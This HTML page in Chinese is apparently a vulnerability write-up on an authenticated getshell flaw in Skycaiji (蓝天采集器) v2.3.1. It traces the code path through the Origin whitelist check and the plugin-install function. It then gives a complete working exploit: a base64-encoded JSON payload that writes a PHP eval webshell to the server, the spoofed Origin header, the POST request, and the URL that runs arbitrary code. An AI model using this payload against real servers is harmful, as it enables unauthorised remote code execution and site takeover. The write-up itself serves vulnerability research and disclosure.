<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="蓝天采集器-v231-后台getshell"><span class="csECDA2D3">蓝天采集器</span><span class="csDE05BCC"> v2.3.1 </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">蓝天采集器</span><span class="cs8926E06"> v2.3.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞出发点位于</span><span class="cs8926E06">/SkycaijiApp/admin/controller/Store.php</span><span class="cs9C1B1871">文件中的</span><span class="cs8926E06">installPluginAction</span><span class="cs9C1B1871">函数，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image0.png" width="560" height="120" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先代码会执行</span><span class="cs8926E06">$this-&gt;_checkOrigin();</span><span class="cs9C1B1871">函数，我们跟进一下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image1.png" width="560" height="323" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该函数是用来判断请求的来源是否在白名单中，注意到这里获取请求来源使用了</span><span class="cs8926E06">$_SERVER[&#39;HTTP_ORIGIN&#39;]</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里我们只要在请求时加上一个</span><span class="cs8926E06">Origin</span><span class="cs9C1B1871">请求头，并将其值改为白名单中的值就可以了，我们看一下白名单的值</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image2.png" width="560" height="42" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回到</span><span class="cs8926E06"> installPluginAction</span><span class="cs9C1B1871">函数，接下来函数将传入的</span><span class="cs8926E06">plugin</span><span class="cs9C1B1871">参数先进行</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">解密在进行</span><span class="cs8926E06">json</span><span class="cs9C1B1871">解码，接着调用</span><span class="cs8926E06">_installPlugin</span><span class="cs9C1B1871">函数，跟进该函数，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image3.png" width="560" height="341" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里函数先进行了一系列数据判空操作，接着下来如果满足</span><span class="cs8926E06">$plugin[&#39;type&#39;]==&#39;release&#39;</span><span class="cs9C1B1871">这个条件将会调用</span><span class="cs8926E06">addCms</span><span class="cs9C1B1871">函数，我们继续跟进</span><span class="cs8926E06">addCms</span><span class="cs9C1B1871">函数，函数位于文件</span><span class="cs8926E06">/SkycaijiApp/admin/model/ReleaseApp.php </span><span class="cs9C1B1871">中，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image4.png" width="560" height="402" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image5.png" width="560" height="145" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先函数会判断</span><span class="cs8926E06">$cms[&#39;app&#39;]</span><span class="cs9C1B1871">是否为空，这里无需理会，在利用时只要构造一下就好，接着代码做了三个正则校验，第一个正则来判断</span><span class="cs8926E06">$cms[&#39;app&#39;]</span><span class="cs9C1B1871">是否符合其命名规范，我们可以使其值为</span><span class="cs8926E06">AaAaAa</span><span class="cs9C1B1871">来绕过校验，第二个正则用来判断函数传入的</span><span class="cs8926E06">$code</span><span class="cs9C1B1871">是否存在命名空间，这里我们可以参考一下位于</span><span class="cs8926E06">/plugin/release/cms/BaseCms.php</span><span class="cs9C1B1871">文件中的写法，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image6.png" width="560" height="139" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着是第三个正则，该处是为了判断类名是否存在，要注意的是类名需要与我们设置的</span><span class="cs8926E06">$cms[&#39;app&#39;]</span><span class="cs9C1B1871">一样，这里我们可以这么写</span></p><p class="cs40DD2BC9"><span class="cs8926E06">class AaAaAa{</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">过了三个正则后我们会来到</span><span class="cs8926E06">write_dir_file</span><span class="cs9C1B1871">函数，跟进一下该函数，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image7.png" width="560" height="130" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该函数用来写文件，那么到目前为止我们就可以在网站中写入一个</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件，但是该文件要存在规定好的命名空间和类，为了写入我们可以利用的一句话，我们可以利用注释符将命名空间和类注视掉，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image8.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来就可以构造符合条件得</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">了</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先将代码</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">编码，然后依据上述分析代码中的条件构造符合的</span><span class="cs8926E06">json</span><span class="cs9C1B1871">格式的字符串</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;app&quot;:&quot;AaAaAa&quot;,&quot;name&quot;:&quot;test1&quot;,&quot;type&quot;:&quot;release&quot;,&quot;module&quot;:&quot;test2&quot;,&quot;code&quot;:&quot;PD9waHAKLyoKbmFtZXNwYWNlIHBsdWdpblxyZWxlYXNlXGNtczsKCmNsYXNzIEFhQWFBYXsKCXB1YmxpYyAkcmVsZWFzZTsKfSovCkBldmFsKCRfR0VUW2FdKTsKPz4=&quot;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着把改串</span><span class="cs8926E06">json</span><span class="cs9C1B1871">字符串</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">编码一下就可以</span><span class="cs8926E06">post</span><span class="cs9C1B1871">过去进行利用了。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞点位于后台安装插件功能处，首先登陆后台</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.</span><span class="cs9C1B1871">访问</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/index.php?s=/Admin/Store/installPlugin</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.</span><span class="cs9C1B1871">添加</span><span class="cs8926E06">http</span><span class="cs9C1B1871">头</span><span class="cs8926E06">Origin:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.post</span><span class="cs9C1B1871">输入</span></p><p class="cs3A447A38"><span class="cs9FB05234">plugin=eyJhcHAiOiJBYUFhQWEiLCJuYW1lIjoidGVzdDEiLCJ0eXBlIjoicmVsZWFzZSIsIm1vZHVsZSI6InRlc3QyIiwiY29kZSI6IlBEOXdhSEFLTHlvS2JtRnRaWE53WVdObElIQnNkV2RwYmx4eVpXeGxZWE5sWEdOdGN6c0tDbU5zWVhOeklFRmhRV0ZCWVhzS0NYQjFZbXhwWXlBa2NtVnNaV0Z6WlRzS2ZTb3ZDa0JsZG1Gc0tDUmZSMFZVVzJGZEtUc0tQejQ9In0=</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image9.png" width="560" height="285" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着会在</span><span class="cs8926E06">\plugin\release\cms\</span><span class="cs9C1B1871">下生成</span><span class="cs8926E06">AaAaAa.php</span><span class="cs9C1B1871">的一句话后门，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image10.png" width="560" height="312" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后在后台点击发布插件选项卡，接着点击开发按钮，如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image11.png" width="560" height="276" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这时会引用我们带有一句话木马的文件，在</span><span class="cs8926E06">url</span><span class="cs9C1B1871">上添加</span><span class="cs8926E06">a</span><span class="cs9C1B1871">参数即可执行任意</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码，进而</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">，以执行</span><span class="cs8926E06">phpinfo</span><span class="cs9C1B1871">为例，访问</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/index.php?s=/admin/Develop/releaseCms&amp;app=AaAaAa&amp;a=phpinfo();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/蓝天采集器/%e8%93%9d%e5%a4%a9%e9%87%87%e9%9b%86%e5%99%a8%20v2.3.1%20%e5%90%8e%e5%8f%b0getshell_files/image12.png" width="560" height="288" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7873</span></p></body>
</html>
